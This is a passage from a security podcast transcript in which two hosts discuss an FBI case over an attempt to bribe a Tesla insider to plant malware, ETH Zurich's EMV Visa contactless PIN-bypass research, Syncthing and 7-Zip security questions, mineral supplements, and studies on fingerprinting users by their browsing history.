According to the complaint, Kriuchkov wined and dined and boozed up the employee and, when discussing especially sensitive details, conducted conversations in cars.  When FBI agents couldn't conduct physical surveillance in restaurants or bars, the employee recorded them.  One meeting occurred on August 7th in a car Kriuchkov had rented.  Referring to the employee again as CHS1, the prosecutors described that August 7th meeting as follows.



They said:  "During this meeting, which the FBI had consensually recorded, Kriuchkov reiterated some of the details of the criminal activity previously proposed to CHS1.  Kriuchkov described the malware attack as he did before, adding that the first part of the attack, a DDoS, would be successful for the 'group,' but the victim company's security officers would think the attack had failed.  Kriuchkov" - and here's some news - "again listed prior companies this group had targeted.  Kriuchkov stated each of these targeted companies had a person working at those companies who installed malware on behalf of the group.  To ease CHS1's concerns about getting caught, Kriuchkov claimed the oldest project the group had worked on took place three and a half years ago, and the group's co-optee still worked for the company."



So in other words, this group has been active for three and a half years.  If we're believing Kriuchkov, his assertions to this employee at Tesla, they have multiple times successfully bribed, presumably, and co-opted someone, an insider, getting them to work with them, to conspire, to insert malware into various U.S. companies to pull this off.  And so of course we can imagine that now that Kriuchkov has been nabbed by the FBI, of great interest will be which are these companies and maybe who are the co-optees, as well.



Anyway, Kriuchkov also told the Tesla employee the group had technical staff who would ensure the malware could not be tracked back to the employee.  In fact, Kriuchkov claimed the group could attribute the attack to another person at the victim company should there be someone in mind the employee wanted to "teach a lesson."  During the meeting CHS1, the Tesla employee, expressed how concerned and stressed he had been over the request.  He stated, if he were to agree to install the malware, he would need more money.  Kriuchkov asked how much.  The employee responded a million dollars.



Kriuchkov was sympathetic to the request and said he understood - remember, this is a recording that the FBI has and is part of this complaint - that he understood and would have to contact the group before agreeing to the request.  Egor confided that the group was paying him half a million dollars for his participation in getting this employee to install the malware, and he was willing to give a significant portion of the payment, 300,000 to 450,000, to the employee to entice his involvement.  The employee said he would need money upfront to ensure that Egor would not have him install the software and then not pay him.  Again, Egor asked how much, and the Tesla employee responded $50,000.  Egor said this was an acceptable amount, and a reasonable request, but he would have to work on this because he only had $10,000 with him due to U.S. Customs restrictions on the amount of money he could bring into the country.



Egor also questioned what would prevent the Tesla employee from taking the upfront money and then not following through on installing malware.  The employee stated that he was sure Egor or the group would figure a way to apply leverage against the employee to ensure that he held up his end of the arrangement.  They discussed the timing of the next meeting, and Egor said he would return to Reno on or around August 17th of 2020.



So, yikes.  This would have been a classic inside job; and it does serve as a reminder that, just as money motivates the bad guys, it's also, as we know, a time-honored motivator used to turn someone, anyone.  And as I said, it's also a little bit sobering that if, again, if we believe what Egor was saying, this doesn't look like the first time this group has done this, and maybe the FBI will be able to get some information about other companies this has happened to.  And you can imagine, if the FBI approached those companies, suddenly the company is wondering, okay, who was the co-conspirator in this?  So a very, very interesting problem.



LEO:  On with the show.



STEVE:  So we've got more problems with the EMV standard.  We've talked a little bit about this over the years.  EMV is the monetary transaction method based upon more than - and this is part of the problem - a 2,000-page specification.



LEO:  Of course.



STEVE:  So if your security spec is 2,000 pages...



LEO:  Who can read that?  Who can follow that?



STEVE:  Exactly.  And who can verify that the way it works is proper?  It's the technical standard underlying the use of smart payment cards, payment terminals, and ATMs.  EMV originally stood for Europay, Mastercard, and Visa, the three companies who created the standard.  And of course that's part of the problem is, rather than making it an open academic cryptographer-laced process, it's more like the Wi-Fi Alliance that did it privately, and now they're sorry.  So next May of 2021, researchers from ETH Zurich, the Swiss Federal Institute of Technology, whose work we've often covered in the past, they'll be delivering a paper at the IEEE Symposium on Security and Privacy titled "The EMV Standard:  Break, Fix, and Verify."



The paper's been released in advance, presumably because this is really bad, and it cannot be readily, well, it can be readily patched and fixed, but keeping it a secret doesn't make any sense.  So they're like saying, look, let's get this fixed.  We're going to talk all about it because the coolness of their paper is the way they found the problems.  It's important that the problems exist, as we'll see.  But the mechanism of what they used is not going to lose any of its punch for waiting nearly a year.  So it's not a matter of responsible disclosure.



It's also not the end of the world since the attacks so far designed still require physical proximity to a Visa card.  But the attack described does completely bypass the system's built-in security measures of the PIN which is designed to prevent abuse of a stolen Visa card.  It also bypasses completely any payment transaction limits which are designed to limit the damage in the case of abuse.  So hopefully this has got the attention of the relevant parties.



The paper's abstract which describes their research reads:  "EMV is the international protocol standard for smartcard payment used in over nine billion cards worldwide.  Despite the standard's advertised security, various issues have been previously uncovered, deriving from logical flaws that are hard to spot in EMV's lengthy and complex specification, running over 2,000 pages.  We formalize," they wrote, "a comprehensive symbolic model of EMV in Tamarin, a state-of-the-art protocol verifier.  Our model is the first that supports a fine-grained analysis of all relevant security guarantees that EMV is intended to offer.  We use our model to automatically identify flaws that lead to two critical attacks, one that defrauds the cardholder and another that defrauds the merchant.



"First, criminals can use a victim's Visa contactless card for high-value purchases without knowledge of the card's PIN.  We built a proof-of-concept Android app and successfully demonstrated this attack on real-world payment terminals."  In other words, once this model found flaws, they then said, oh, we know how to do that.  And so they wrote some Android apps - that actually takes two apps and two phones, I'll explain all that in a minute - which pulled off the heist.  It works.



"Second," they said, "criminals can trick the terminal into accepting an unauthentic offline transaction, which the issuing bank should later decline, after the criminal has walked away with the goods.  This attack is possible for implementations following the standard, although we did not test it on actual terminals for ethical reasons."  In other words, it would have defrauded the merchant, they said, though it seems like that could have been handled by engaging a willing and interested merchant and, like, giving back the goods after the bank declined the transaction.



In any event, they said:  "Finally, we propose and verify improvements to the standard that prevent these attacks, as well as any other attacks that violate the considered security properties.  The proposed improvements can be easily implemented in the terminals and do not affect the cards in circulation."  So that's important.  We cannot update nine billion existing Visa cards, nor do we have to.  The terminals can be fixed, and hopefully they're connected to a network, and they can be updated online, over the network.  So it looks like this can be remediated globally without much trouble.  Anyway, so this EMV standard, as I noted, was developed by another closed group, and this is what you get when that happens.



To establish a bit of background, the researchers wrote:  "EMV, named after its founders Europay, Mastercard, and Visa, is the worldwide standard for smartcard payment, developed in the mid-1990s."  And truthfully, given that it's, what, 25 years old, I guess I cut it a little bit of slack.  They certainly did know how to do things then as well as we do today.  And what is so cool is that we're beginning to see the emergence, we've covered some already recently, of applying not quite AI, but automated protocol verification to bring real guarantees of robustness to protocols.



Anyway, they said:  "As of December 2019, more than 80% of all card-present transactions globally use EMV, reaching up to 98% in many European countries."  In other words, 80% as of December 2019.  So basically that's what transactions are using is this EMV protocol.  "Banks have a strong incentive to adopt EMV due to the liability shift, which relieves banks using the standard from any liability from payment disputes.  If the disputed transaction was authorized by a PIN, then the consumer is held liable. If a paper signature was used instead, then the merchant is charged."  But in neither case is the bank responsible.



"So besides the liability shift, EMV's global acceptance is also attributed to its advertised security.  However, EMV's security has been challenged numerous times.  Man-in-the-middle attacks, card cloning, downgrade attacks, relay attacks, and card skimming are all examples of successful exploits of the standard's shortcomings."  So in other words, yes, it's 25 years old, and it is showing its age because it was never rigorously developed, and it was developed in a closed setting.



They said:  "The MITM [man-in-the-middle] attack is believed to have been used by criminals in 2010 and 2011 in France and Belgium to carry out fraudulent transactions totaling 600,000 euros.  The underlying flaw of the attack is that the card's response to the terminal's offline PIN verification request is not authenticated.  Some of the security issues identified result from flawed implementations of the standard.  Others stem from logical flaws whose repairs would require changes to the entire EMV infrastructure."  In other words, meaning it's too late to fix them now.



They said:  "Identifying such flaws is far from trivial due to the complexity of EMV's execution flow, which is highly flexible in terms of card authentication modes" - in other words, this suffers from the kitchen sink problem of security.  Also they said "cardholder verification methods, and online/offline authorizations."  Again, they just tried to do everything with this.  "This raises the question of how we can systematically explore all possible flows and improve the standard to avoid another 20 years of attacks."  So that's what they did.



They explain:  "In this paper we focus on weakness and improvements to the EMV protocol design.  We present a formal, comprehensive model for the symbolic analysis of EMV's security.  Our model is written in Tamarin, a state-of-the-art verification tool that has been used to study numerous real-world protocols, including TLS 1.3 and 5G authentication.  Tamarin supports protocol verification in the presence of powerful adversaries and many concurrent protocol sessions without bounds.  Our model supports the analysis of all properties that must hold in any EMV transaction.  An informal description of the three most relevant properties are:  Bank accepts terminal-accepted transactions:  No transaction accepted by the terminal can be declined by the bank.  Authentication to the terminal:  All transactions accepted by the terminal are authenticated by the card and, if authorized online, by the bank.  And third, authentication to the bank:  All transactions accepted by the bank are authenticated by the card and the terminal."



They said:  "Our model faithfully considers the three roles present in an EMV session:  the bank, the terminal, and the card.  Previous symbolic models merge the terminal and the bank into a single agent.  This merging incorrectly entails that the terminal can verify all card-produced cryptographic proofs that the bank can.  This is incorrect, as the card and bank share a symmetric key that is only known to them.  Using our model," they said, "we identify a critical violation of authentication properties by the Visa contactless protocol.  Specifically, the cardholder verification method used in a transaction, if any, is neither authenticated nor cryptographically protected against modification.



"We developed a proof-of-concept Android app that exploits this to bypass PIN verification by mounting a man-in-the-middle attack that instructs the terminal that PIN verification is not required because the cardholder verification was performed on the consumer's device.  This enables criminals to use any stolen Visa card to pay for expensive goods without the card's PIN.  In other words, the PIN is useless in Visa contactless transactions."



So in practice they used a pair of standard Android smartphones, each running a custom app that they wrote.  The smartphones do not need to be hacked.  No root privileges or anything fancy is required.  Just generic custom Android apps which successfully ran on phones.  In this case they used them both on Pixel phones from Google and also handsets from Huawei.  The two phones are linked by WiFi so they can talk to each other.  One phone uses its NFC radio to interact with the stolen card, thus pretending to be and emulating the point-of-sale terminal which the card thinks it's talking to, while the other phone uses its NFC radio to emulate the payment card to the authentic point-of-sale terminal.  Thus the point-of-sale terminal thinks it's talking to the card.  It's instead talking to the Android phone's NFC.



So you can see what this does is each of the devices, the card and the terminal, normally have an NFC link to each other.  Instead, we separate them with an Android phone-based link, allowing the protocol to be modified on the fly.  And the point is this system is unfortunately weak enough that the protocol can be tweaked as it moves between the two Android phones to convince the card that it's talking to the point-of-sale terminal, and to convince the point-of-sale terminal that the PIN has been managed between the user and the card.  Therefore the terminal need not ask for a PIN.  And there's another protocol flaw that allows a limit which is normally imposed on PIN-based transactions, exactly for this purpose, to simply be bypassed.  So an unlimited size transaction can be performed against an NFC-linked EMV terminal used in 98% of transactions in the EU and 80 globally, against any Visa contactless payment card, without needing the PIN from the owner.



As I said, this is an important piece of work.  They took a 2,000-page spec which is mind-boggling complex, reduced it to a symbology, which then allowed them to code this into their research app that was able to analyze the resulting protocol, spot the flaws, and from that they developed a proof of concept which successfully works.  And hopefully it will be possible to - they indicated a fix was possible in the point-of-sale terminal, which with any luck will be going out to all of these point-of-sale terminals globally before much longer.



So anyway, very, very cool piece of work from these researchers in Switzerland.  And really sort of a demonstration of the way we're seeing high-level analysis of security protocols now being performed.  It's not just ad hoc analysis, especially for things that are as complex as this.  You develop a means for turning a computer loose on it and allowing it to highlight problems and find them for you.  And then you go manually look to see what's going on.



On the flipside, we've seen something sort of like that with directed fuzzing, where we use a computer to throw just junk at an API.  And if it manages to crash the system, then you bring the humans in to figure out what it was that did the crash, reproduce it, and then see if it's possible to instrument it.  So very cool.



I have some miscellany.  Some closing-the-loop stuff, but some miscellany.  Back in the early days of the COVID-19 pandemic I shared a few YouTube videos that seemed important.  Thanks to the use of my grc.sc redirect links, I'm able to get some sense for our listeners' interest in various topics.  5,963 of our listeners visited the first of those COVID links I shared.  That was that excellent Ars Technica guide in the very early days that provided some information, very useful.  6,376 visited the second, which was the "coronavirus explained" video.  And 5,942 visited the third, which was that whiteboard, that medical school class grade whiteboard on COVID-19.  And those numbers  place COVID-19 or interest in it at the top of the historical counts of the links visited.



So today I have a fourth, which is frankly an astonishing video produced by a hardworking medical doctor researcher explaining the operation of the three primary technologies employed for testing for the presence of the COVID-19 virus or antibodies.  The link is grc.sc/covid4, C-O-V-I-D-4.  Again, grc.sc/covid4.  I believe that - aside from being seriously educated about the operation of these tests, frankly in way too much detail, so don't worry about understanding it all the first time you watch it.  Just sort of let it wash over you.  I was really impressed.  Anyone watching this will come away with a deep appreciation for the complexity of testing, a sober sense for how much medical science has successfully reverse-engineered our genetics.  It's just really cool.



And perhaps some better sense for why it appears that so far testing for COVID-19 has been seriously botched.  It is a truly delicate, error-prone, and error-fraught process.  You'll get many clues about that from watching this video.  It's about a 43-minute-long video.  And testing just could not succeed in any environment of corner-cutting or rushing to get a result.  But anyway, don't take my word for it.  If you watch the video, you'll understand.  So grc.sc/covid4.  It's probably too much for some people who aren't interested in details.  But it's really, really compelling.  And again, it's clear that our listeners had an interest in it, and so I wanted to extend this.  This just came to my attention.  Somebody posted it over in the grc.health newsgroup.  And so it's just - it's excellent.



I received a DM from a listener saying:  "Hi, Steve.  I was wondering if storing password manager database in Google Drive or Dropbox is safe."  And so I suggested that the best thing to do would be to first use the 7-Zip archiver with a strong password.  We talked about it recently.  Well, first of all, it'll scrunch the password database way down.  And once it's encrypted with a strong password, it won't matter who obtains it.  This is the old TNO approach of Trust No One, where you encrypt before it leaves your system.



And we talked about 7-Zip recently.  I looked deep into it again.  They did all the encryption right.  They use a strong password-based key derivation function based on SHA-256 to generate the encryption key.  And at that point, once you've done that, it's probably the password manager that's keeping all of those private is the weakest link because they're in active use.  If you create a really well-encrypted archive with a strong password, your stuff is safe.  And then by all means, you can put it anywhere, pretty much.



Alan Kopp tweeted:  "A little puzzled by your recommending Syncthing last week.  Are you really okay with it doing its connecting over the Internet without a VPN?"  And Leo, this links back to what you and I were talking about before the podcast.  And I replied to him.  I said:  "Yes, I'm okay with Syncthing because of the way it's designed.  All endpoints can, and typically do, sit safely behind a NAT router, so there's no port open to be scanned.  A set of rendezvous servers out on the public Internet receive outbound pings from the Syncthing endpoints, and all communication is over TLS v1.2 with the rendezvous server's certificates pinned by the clients."



So the privacy of the conversations is as strong as a VPN's.  If a bad guy were to compromise one of the rendezvous servers, they could send their ID, their endpoint ID, to an endpoint and ask to be connected.  But that's the extent of the threat.  As anyone using Syncthing knows, you get a notice saying this endpoint wants to connect to you and share stuff.  And you have to permit it in order for anything to happen.  So you would just see this bogus request and say no.  I mean, like in the worst case, that's all that would happen.



And Syncthing clients are able to use public STUN servers, S-T-U-N servers, to knit together direct NAT-to-NAT connections between peers that are both located behind NAT routers.  We discussed the STUN and TURN protocols to support NAT many years ago.  And if direct NAT traversal fails, relay servers are also available for inter-client relaying.  But even then, since all data is truly end-to-end encrypted between client endpoints with certificates, there's no exposure of the relayed data to the relay server.  So yes.  As we said, I mean, I'm using it to transport mission-critical stuff.  Leo, I know you are.  And I do so without question.  These guys - oh, and all of the protocol is open.  They have beautifully documented four different specific protocols.  Like the block transfer protocol is laid out.  It's explained.  It's like it's RFC-like in its thoroughness.  So I'm just very impressed with Syncthing.  And I use it without concern.



LEO:  Oh, I'm so happy because I use it religiously for everything.  Everything.



STEVE:  Yeah.  It's just a win.



LEO:  And I think I'm going to do that - kind of this ties your previous question together, do some pre-Internet encryption on a Syncthing folder because there's files I want to get on all my computers, but I'm just nervous about having them visible in any way.  If I use 7-Zip, for instance, to password encrypt them, and then sync that blob, that would be even a bit safer, wouldn't it.  Things like my dotfiles, my PGP passwords, things like that.  Not passwords [crosstalk].



STEVE:  Yeah, I would say, you know, if they're really critical, and they don't need to have like automated access, if for example you want to have access to them, but you'd be unpacking them and sticking them in the root directory of a new Linux build or something, then it would make sense.



LEO:  Yeah, exactly, because that's what I do.



STEVE:  If it doesn't have to be dynamically modified.



LEO:  Yeah, that's exactly what I do, yeah.  I keep standardized dotfiles.  Any time I do a new setup I want to have that there.  So that's perfect.  Good.  Good.



STEVE:  Yeah.  So...



LEO:  I'm glad you mentioned Syncthing.  I love it.  I needed your [crosstalk] approval. 



STEVE:  Yeah, it's good.  And just the ability to build an ad hoc peer-to-peer network, I mean, it's just - that's very cool.



LEO:  Yeah, with no third party.



STEVE:  So Jon tweeted, someone named Jon tweeted via DM.  He says:  "Do you have a recommendation on a Zinc supplement?"  He said:  "My doctor suggested I add a zinc supplement to my vitamin regimen."  He says:  "Thanks for all the health insights you've shared on Security Now! over the years."  And so I do have something useful, probably to a lot of our listeners.  There's only one, or at least one very clear way to choose which one from among many.  And I'll just give a little brief bit of what I've learned about this since I crossed this bridge 15 years ago.  The most important thing to appreciate is that not everything we swallow is absorbed the way we intend across our intestinal lining to make it into our bloodstream.  And things that do not naturally occur in food, like a mineral supplement, are often not readily absorbed because we're trying to fool Mother Nature.  As it turns out, in this instance she can be fooled.



I looked at this 15 years ago, after I read several books about magnesium.  I became convinced, as I remain today, that I wanted to get as much magnesium into me as I could for the rest of my life.  For reasons maybe I'll discuss someday, it's really crucial.  And that's what I've been doing ever since.  But it turns out that's easier said than done.  Since this is not a health and nutrition podcast, I won't spend the hours talking about it that I easily could because it fascinates me.  Maybe someday.



So here's the bottom line.  Most mineral supplements are packaged as a simple salt of the mineral - zinc citrate, zinc picolinate, zinc gluconate, for example, in the case of zinc.  The problem with all of these simple salts of zinc, or magnesium, for that matter, is that those compounds quickly disassociate in the acidic low pH environment of our stomach.  After that, we have atoms of the mineral floating around loose and not being well absorbed by the lining of our upper small intestine.  One company named Albion Minerals, A-L-B-I-O-N, Albion Minerals, figured out how to solve this problem.  They produce a large range of raw material, both for animal (veterinary) and human consumption.  They turn the raw mineral into a dipeptide, which is the mineral bound to two amino acids.  Glycine, which is the smallest of the amino acids, is the preferred choice.



So there exists a substance known as zinc bisglycinate, consisting of an atom of zinc held in by two glycine molecules.  What's special about this complex is that our digestive system sees it as an organic molecule rather than a mineral.  And unlike any of the salts, it's resistant to disassociation, and it remains intact as a consequence in our stomach's acidic low pH environment.  That allows it to progress as a whole into our intestines where our intestinal lumen's active transport disassembles it and moves it into our bloodstream.  The result is that a far greater percentage of what we swallow makes it into us.



Albion is not a retailer, so you'll see no brands, you won't see any supplements by them.  They exclusively manufacture the bulk supplement raw material.  So you'll find their name and their trademarks, Albion and TRAACS, T-R-A-A-C-S, which is some abbreviation for something, some means of measuring it, on the supplements.  Doctor's Best uses them, Healthy Origin uses them, and a number of other supplement makers do.  So for what it's worth, when shopping for mineral supplements, look for the words Albion or TRAACS.  I jumped onto Amazon, googled Albion zinc, and found an inexpensive zinc supplement which I responded to Jon.  And it was zinc bisglycinate, available from a [crosstalk].



LEO:  And what does the zinc do, just out of curiosity?  I'll take as given I want it, but...



STEVE:  Yes.  Zinc is a useful supplement.  It provides immune system support, for one thing.



LEO:  Oh, that's probably a good thing to have, yeah, nowadays.



STEVE:  Yeah.  So it's a good thing to have these days.



LEO:  I take the magnesium you recommended that's also TRAACS.



STEVE:  Yes.



LEO:  As you mentioned, yeah.



STEVE:  Exactly.  I consume it in great quantities.



LEO:  You eat a lot more than I do.  I do two tablets in the morning and at night.  What do you do, like five twice a day, something like that?



STEVE:  I do, yes.  I do five twice a day.  But I'm glad you're taking two, Leo.  It's good.



LEO:  Better than nothing.  It can affect your digestive system a little bit, so you want to kind of work your way up.



STEVE:  Well, exactly.  That's how you determine where your limit is.



LEO:  Yeah.



STEVE:  You'll know when you've taken too much.



LEO:  You'll know, yeah, yeah.  Let's just put it this way.  It's the same ingredient in Milk of Magnesia.  Give you some idea.  Okay.



STEVE:  One of my high school buddies, two of them became MDs.  One is a lifelong ER doc.  And in fact he lives up in Healdsburg, where he's only recently been allowed to return to his wonderful ranch on a vineyard as a result of the fires up there recently.



LEO:  It's been so bad, yeah.



STEVE:  Anyway, but he's a lifelong ER doc, and he calls magnesium the "miracle mineral."



LEO:  Really.  Wow.



STEVE:  So apparently it's been of great use for him in helping people who are in emergent trouble.



LEO:  I take it on faith.  You tell me to take it, I take it.



STEVE:  I'm glad you do.



LEO:  Yes.



STEVE:  So anyway, lastly, I got a tweet from LOLPANDA, who said, "Hi, Steve.  I'm sorry to tweet here" - I don't know why he's apologizing.  That's what Twitter's for.  But, he says:  "I'm so excited to say hello and thank you!!  Once again SpinRite helped me by saving hours of work.  SpinRite isn't only a matter of zero and one, it's magic.  Trillion thanks."



LEO:  Nice.



STEVE:  And by way of update I can finally report that the development of the AHCI driver has reached a new and very welcome stage.  Test release 29a of the AHCI benchmark was posted to the group last week, and it has been rather exhaustively tested over the weekend.  For the first time ever, there has not been a single problem that anyone has found running it on any of their various PCs.  So it appears to be ready for its much larger and broader testing debut.  Once this podcast is conducted, or concluded, conducted and concluded today, I'll be integrating the earlier IDE hardware driver work into the new AHCI driver to produce a single benchmark that should run at maximum possible speed on any drive and be able to benchmark any drive's read performance on any PC, and on older Macs that offer the Boot Camp booting option.



We've got a bunch of Mac users who have been testing this along the way.  And in fact I bought a Mac, an older MacBook Pro, because there was a weird power management behavior that I was unable to untangle remotely, and I did after I got one.  So just for the record, so people don't go off looking for it, I don't have anything yet.  There's no download link.



I need to integrate things.  I'll end up building an app which, like the InitDisk, will prepare a bootable USB thumb drive that you can use to boot any computer you want to and benchmarks its hard drives at absolutely their maximum link and throughput speed.  Probably surprise you with some of the things that you find based on some of the things that we have found.  And in the process you'll be further testing this driver, and I'll have a web forum set up in order to solicit feedback from users.  And that's like the final stage before this moves into SpinRite, and we get 6.1.  So we're getting there.



LEO:  Steve, what did I do last summer?  Because I don't remember.  It's all a blur.



STEVE:  I don't think any of us - I think a lot of us did very little this last summer.



LEO:  Yeah, that's right.



STEVE:  There are two pieces of research, one conducted eight years ago in 2012, and a similar very closely related research which was presented just last month during the USENIX 16th Symposium on Usable Privacy and Security.  The early paper from 2012 was titled, interestingly, "Why Johnny Can't Browse in Peace."  Okay? 



LEO:  Okay.



STEVE:  On the uniqueness of web browsing history patterns.  It explains its purpose and its findings as follows.  They wrote:  "We present the results of the first large-scale study of the uniqueness of web browsing histories, gathered from a total of [a lot] 368,284 Internet users who visited a history detection demonstration website."  And remember we've previously talked about how this can be done.  Since our browsers will color previously visited URL links differently from ones it has not seen before, it's possible for a sneaky website and server to remotely probe our browser's site-visiting history by placing test URLs into the DOM (Document Object Model) and then using the Canvas API to read out the rendered color of those links.



Again, not anything any of the designers of these APIs ever intended to have happen.  But as we keep seeing, where there's a will, there's a way.  And the more sophisticated and complex we make our browsers, the more they become little like Turing complete systems that can do all kinds of unexpected and unintended things.



Anyway, in their abstract they wrote:  "Our results show that for a" - okay, so just backing up.  368,000-plus Internet users visited this history detection demo website, which sucked, essentially and effectively, sucked the browsing history out of their web browser, which is not supposed to be available to sites you visit; right?  That's none of their business.  But again, it can be done.  They said:  "Our results show that for a majority of users (69%), the browsing history is unique, and that users for whom we could detect at least four visited websites were uniquely identified by their histories in 97% of cases."  In other words, where we steer our browsers is surprisingly unique.  And I know my own browser use.  Yeah, I go to a few sites, like DigiKey and DigiCert, that lots of other people are not going to be going to directly.  So I can see that.



They said:  "We observe a significant rate of stability in browser history fingerprints.  For repeat visitors, 38% of fingerprints are identical over time, and differing ones were correlated with original history content, indicating static browsing preferences.  We report a striking result that it is enough to test for a small number of pages in order to both enumerate users' interests and perform an efficient and unique behavioral fingerprint.  We show that testing 50 web pages is enough to fingerprint 42% of users in our database, increasing to 70% with 500 web page tests.



"Finally, we show that indirect history data, such as information about categories of visited websites, can also be effective in fingerprinting users" - sort of like taking a meta view of websites, classifying similar websites, and then using that as the fingerprint.  That's also effective to fingerprint users - "and that similar fingerprinting can be performed by common script providers."  Again, "...similar fingerprinting can be performed by common script providers such as Google or Facebook."



LEO:  Hmmm.



STEVE:  Okay.  So in other words - uh-huh, uh-huh.  It's not just cookies, and it's not just obvious things.  In other words,  this introduces another entire category of tracking signal and/or tracking reacquisition in the event of third-party cookie blocking or deliberate cookie deletion.  Our browser histories turn out to serve as a surprisingly powerful disambiguator.



LEO:  That makes sense, yeah.



STEVE:  It does make sense.  And as I mentioned, that research was followed up on and recently updated by a three-person team at Mozilla.  Their USENIX paper from a couple weeks ago was titled "Replication:  Why We Still Can't Browse in Peace:  On the Uniqueness and Reidentifiability of Web Browser Histories."  And they explain their work and their findings a little more briefly as follows.  They said:  "We examine the threat to individuals' privacy based on the feasibility of reidentifying users through distinctive profiles of their browsing history visible to websites and third parties."  Again, that's the key.  Visible to websites and third parties.



They said:  "This work replicates and extends the 2012 paper 'Why Johnny Can't Browse in Peace:  On the Uniqueness of Web Browsing History Patterns.'  The original work demonstrated that browsing profiles are highly distinctive and stable.  We reproduce those results and extend the original work to detail the privacy risk posed by the aggregation of browsing histories.  Our dataset consists of two weeks of browsing data from about 52,000 Firefox user volunteers.  Our work replicates the original paper's core findings by identifying 48,919" - now remember, out of 52,000, 48,000, almost 49,000, 48,919 - "distinct browsing profiles, of which 99% are unique.  High uniqueness holds even when histories are truncated to just 100 top sites."



LEO:  Wow.



STEVE:  Uh-huh.  We then find...



LEO:  This is really not surprising, really.



STEVE:  Yeah.  I agree, Leo.  I mean...



LEO:  What's surprising is that they can read it.



STEVE:  Yes.



LEO:  That's what's annoying.



STEVE:  Uh-huh, exactly.



LEO:  Of course, if you have it, you can make - it's probably very unique.



STEVE:  Yup.



LEO:  100%.



STEVE:  "We then find that for users who visited 50 or more distinct domains in the two-week data collection period, about 50% can be reidentified using the top 10,000 sites.  Reidentifiability rose to over 80% for users that browsed 150 or more distinct domains.  Finally, we observe numerous" - so basically what that's saying is that, if in a short period of time not many total domains were visited, that is, some people just didn't roam broadly, then there just isn't enough virtual...



LEO:  Right, uniqueness, yeah.



STEVE:  ...uniqueness, yes, in order to identify them.  But if a person tends to roam around a lot more to, for example, visit 150 different distinct domains, then they become much more, 80% reidentifiable.  And they said:  "Finally, we observe numerous third parties pervasive enough to gather web histories sufficient to leverage browsing history as an identifier."  So in other words...



LEO:  Remember when we talked about how Google was doing the work of god by taking third-party tracking cookies out of Chrome finally?  



STEVE:  Uh-huh.



LEO:  But we surmised at that time, that's only because they have a better way of fingerprinting you.  And they don't want the amateurs doing it.  Let us fingerprint users.  And of course this proves it.



STEVE:  Yes.  So exactly.  The overt privacy problem of cookies that everyone looks at turns out to be like, okay, fine, block them.  We don't care.  And you'll notice that DNT didn't go anywhere because it didn't specify how you track, just please don't.  And so it's like, no, we don't really want to do that.  We don't want people to - we don't want to have to honor someone saying don't track me because we'll just say, okay, wouldn't you like those cookies removed?  Yeah, we'll scrape those off for you.



So it is discouraging.  There are two ways that our histories can be obtained.  They can be obtained by sucking them out of our browser, for which the technology exists.  All of these different entities - oh, Leo?  I discovered a creepy site called DoubleVerify.com.  If you go to DoubleVerify.com and just sort of - this is one of the people, one of those that we sometimes see.  They tend to stay in the shadows.  They don't like to be seen.  But I picked up on them when I was doing this research about what sites are there doing this behind our backs?  It is a super slick-looking site.  But it's a little bit creepy when you sort of understand that these are the people who are putting little script snippets in ads and on websites.



LEO:  But they're in the business of trust, Steve.



STEVE:  Oh, oh.  I missed that, Leo.  I didn't see where it said that.  Uh-huh.



LEO:  How could they be bad?  How could they be bad?  By the way, this stupid Accept Cookies popup, of course.  Now we know that's meaningless.  Yeah, sure.  Whatever.  Go ahead, put cookies on there.  That'll stop them.



STEVE:  Yeah, that'll keep them pacified.



LEO:  Yeah.  Oh, man.



STEVE:  Yeah.



LEO:  Yeah.  There's a lot of this in the world.  They call these "tracking pixels."  And there's all sorts of ways to do this, even though - in fact, lots of them are not pixels anymore.  That's just kind of that's how they used to do it.



STEVE:  Right.  They drop little bits of script now, and they're able to do much more.



LEO:  Much more, yeah.



STEVE:  It's very much like the Google Analytics that it's so useful for the website because Google tells you all kinds of cool stuff.  But it's also Google running their own script on every single one of those pages out in the world.  Yeah.



LEO:  Really interesting, yeah.



STEVE:  Yeah.  So that and an ISP monitoring our DNS queries.  That's the other way you obtain browser histories is by looking at the DNS lookups that all of your clients are using.  And so another sort of little nudge towards using encrypted DNS in the future, which looks like it's where we're all headed.  So anyway, I thought that was really, really interesting.  I just wanted to put it on all of our listeners' radar that, yes, maybe it's worth flushing our browser histories.  It's sad, too, because I really like the fact that my links are, you know, when I do a search for something that's related to something I've searched for before, I see some that are purple, and I go, oh, I've already been in there.  No need to go again.  And, oh, Google's a little spooky because it'll say, oh, you were there three days ago.  It's like, okay.  Yeah, well, I am being - I'm being tracked.



LEO:  Well, you know, also I'm a little sympathetic...



STEVE:  It's free.  Everything's free, Leo.



LEO:  Yeah, I'm a little sympathetic.  We do a little bit of that ourselves, to be in full disclosure, because podcasts you really can't do tracking pixels, as you might imagine.  But that's one - remember we were talking earlier about redirects.  One of the redirects goes through a company called, I can't remember the name.  Want to say Chartbeat.  I can't remember.  But it goes through a company that does an interesting thing, and I think this is - our advertisers say you've got to do something.  So we don't do it for everybody.  They have to pay for it.  We don't.  They don't get any information, which is the good news.



But what happens is this company gets, effectively, our logs.  They get the redirects through them.  So they track the IP addresses.  They store those of all the downloads.  But they don't give them to anybody.  We're very careful to make sure.  This is not public information.  It's the same stuff that we've been using, we send to Podtrac, the same exact stuff.  And then if a company wants to contract with them for an ad campaign, let's say LastPass says we want to see if this drove any traffic, of course we always use those URLs, and we hope people will use them.  But they're not - companies say, well, we don't know if we trust them.  Most companies, most of the URLs tend to be TWiT, even though like if I have the Security Now!, people are still going to use TWiT instead as the offer code.



STEVE:  Right, right.



LEO:  So everybody says, well, TWiT works, even if they've never been on TWiT.  They say, well, that's the one that works the best because everybody uses that.  So you lose some credit.  So a company, if they want to do more informational tracking, will then put the tracking pixel from this company, Chartable I think, on their site.  And then that redirects IP addresses of people visiting their site or their landing page to Chartable.  And Chartable does a matchup.



STEVE:  Ah, right.



LEO:  And without sending IP address information to the advertiser, or disclosing it, they say 82% of the people that visited your site in this three-week period also downloaded Security Now!.



STEVE:  Nice.



LEO:  So I consider that relatively benign.  We have to do something because advertisers are really, nowadays, I mean, look, we're competing against Facebook and Google, who tell them everything; right?  They know everything about you.  We know nothing about you except for the fact that you've downloaded that show.  So I think this is a relatively benign way, without disclosing any information about you to any third party, matching those IP addresses up gives them some knowledge about how successful their campaign was.  And at this point [crosstalk].  



STEVE:  Well, and also bouncing through multiple redirects tends to be an anonymizing thing anyway, I mean, so...



